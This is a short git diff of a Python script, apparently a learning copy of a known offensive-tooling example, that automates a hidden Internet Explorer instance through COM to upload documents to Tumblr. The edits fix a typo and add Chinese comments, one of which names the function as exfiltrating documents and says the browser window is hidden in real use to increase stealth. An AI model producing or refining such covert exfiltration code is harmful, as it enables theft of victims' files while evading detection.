@@ -122,15 +122,17 @@ def post_to_tumblr(ie, title, post):
     title_box.focus()
     random_sleep()
 
-    post_form.childran[0].click()
+    print(post_form.children[0])
+    post_form.children[0].click()
     wait_for_browser(ie)
 
     random_sleep()
 
     return
 
+#exfiltrate函数的输入是我们想存储到Tumblr上的文档
 def exfiltrate(document_path):
-    # 创建IE实例化对象
+    # 创建IE的COM对象实例
     ie = win32com.client.Dispatch("InternetExplorer.Application")
     # 调试阶段设置为1，实际设置为0，以增加隐蔽性
     ie.Visible = 1
